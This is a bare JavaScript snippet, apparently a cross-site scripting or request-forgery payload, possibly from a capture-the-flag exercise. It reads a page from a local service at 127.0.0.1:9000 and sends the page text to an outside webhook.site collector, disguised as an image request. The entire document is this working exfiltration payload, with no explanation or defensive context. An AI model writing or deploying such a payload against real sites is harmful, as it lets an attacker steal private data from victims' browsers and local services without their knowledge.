
fetch("http://127.0.0.1:9000/view/129c0456-96c8-4afc-ac2c-9e21a94367d9").then((res) => {
	return res.text();
}).then(data => {
	fetch("https://webhook.site/6c90eef6-1fc5-43f3-b05b-800a1c1fcc21/a.png?data="+data);
})
